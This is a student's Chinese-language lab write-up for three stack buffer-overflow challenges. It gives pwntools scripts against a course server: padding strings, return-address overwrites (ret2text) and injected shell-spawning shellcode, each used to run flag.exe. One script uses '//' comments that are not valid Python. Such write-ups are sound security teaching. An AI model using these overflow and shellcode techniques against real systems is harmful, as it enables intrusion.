解雲暄	3190105871

### 01 bof-baby
用 gdb 查看 `hear()` 函数的汇编代码：
![image.png](./assets/1647871057197-878a0895-1b4b-4c47-b633-472fa1bcd2ef.png)
可以看到，相关的栈布局是：<br />![77F10AF3816E2743B1CAC3FDE8152E7A.png](./assets/1647877742094-875f2daa-1874-4d3b-b3e5-d16dd9755c9f.png)
因此，我们只需要构造一个长度为 62 的字符串，使得其最后两个 4 字节的内存取值相等。如：<br />`01234567890123456789012345678901234567890123456789000000000000`

通过代码连接远端：
```python
from pwn import *
context.log_level = 'DEBUG'     # 将pwntools的日志级别记为调试
conn = remote("116.62.228.23", 10100)       # 连接到远程目标
conn.interactive()              # 打开交互模式操作远程shell
```

输入对应数据，就 hack 了！
![image.png](./assets/1647877844886-df28f658-5b74-4816-87f7-4b4611b9d960.png)
现在可以访问 shell 了，访问 flag.exe：
![image.png](./assets/1647877893845-9599990e-2d59-4c5e-8a3e-5cae2a122dd6.png)
得到结果！
![image.png](./assets/1647877662764-385dcc66-60c9-489f-89b6-3ac3a9db1034.png)



### 02 bof-boy
参考了 [基本 ROP - ret2text | CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text)。

用 gdb 查看代码，分析栈结构：
![image.png](./assets/1647882117916-9127470c-f180-4551-9311-e0ed15b084e3.png)
用工具查看调用 shell 语句的位置：
![image.png](./assets/1647882244009-feba2245-6218-4af2-a334-8688fcb7df2d.png)
因此我们只需要将栈中的返回地址改为该语句的位置，即可实现当函数 `func()` 返回时跳转到运行 shell 的语句，即：<br />![80B97A0B7A48B33F6E7FBC731C6F73DA.png](./assets/1647882330109-eab65bfc-f929-46c2-b1fd-ba2e5f52f164.png) <br />因此可以设计出如下代码：
```cpp
from pwn import *
context.log_level = 'DEBUG'
conn = remote("116.62.228.23", 10101)

conn.recvuntil("Please input your StudentID:\n")
conn.sendline("3190105871")

// 需要发送 0x48, 即 72 个字节的字符串
conn.recvuntil("data:\n")
conn.sendline("72")

target = 0x080485ee	// 目标地址
conn.recvuntil("data:\n")
// 发送 0x44 个 0，然后将 ret addr 覆盖为 target
conn.sendline(b'0' * 0x44 + p32(target))

// 运行 flag.exe
conn.sendline("./flag.exe 3190105871")
conn.interactive()
```
运行可得到正确结果：
![image.png](./assets/1647881962754-9ae9ff68-f1d5-4242-9e32-2d9df03209b2.png)


### 03 bof-again
参考了 [基本 ROP - ret2shellcode | CTF Wiki](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode)。

注意到 elf 文件没有 NX 保护：
![image.png](./assets/1647883253918-ef47ef3d-7210-473c-9486-66040ab2e775.png)
基本思路是将 shellcode 写入 str，然后在 func 中篡改返回地址使其跳转到 str 运行 shellcode。

观察到 str 位于 0x804a040 位置：
![image.png](./assets/1647883427452-915de53b-101d-46b5-b36f-b81e37d66ed5.png)

使用类似前两个实验的方法获知 func 函数内的栈布局：<br />![356C476BC1AFD0A41F137660F6B6C11A.png](./assets/1647884366509-f21cdc66-bbff-4212-9fe0-b87b7acebed5.png)
刚开始本来打算像下图中绿色的那样，在 0~31 的位置放 shellcode，在 32~35 放 ret addr；后来发现 shellcode 占 44 个字节，所以只能放到 36 后面去了，即下图中橙色的样子：

![6664FB5DD975DEA2E694B1E3B0C6975A.png](./assets/1647884610501-9205f576-f257-4f9e-abce-868797b68e5c.png)
因此我们设计出这样的代码：
```python
from pwn import *
context.log_level = 'DEBUG'
conn = remote("116.62.228.23", 10102)

conn.recvuntil("Please input your StudentID:\n")
conn.sendline("3190105871")

shellcode = asm(shellcraft.sh())
target = 0x0804a040 + 36
conn.recvuntil("Give me something to overflow me! \n")
conn.sendline(b'0' * 32 + p32(target) + shellcode)

conn.sendline("./flag.exe 3190105871")
conn.interactive()
```
其中，target 是新的 ret addr，在 str 向后偏移 36 个字节的位置；str 前 32 个字节为字符 '0' 用于填充，后面的 4 个字节是 target 用于覆盖 ret addr，然后是 shellcode。

运行，可以得到 flag：
![image.png](./assets/1647884230399-2a0c6d0f-f802-4c91-a8c9-056b1f7a21be.png)
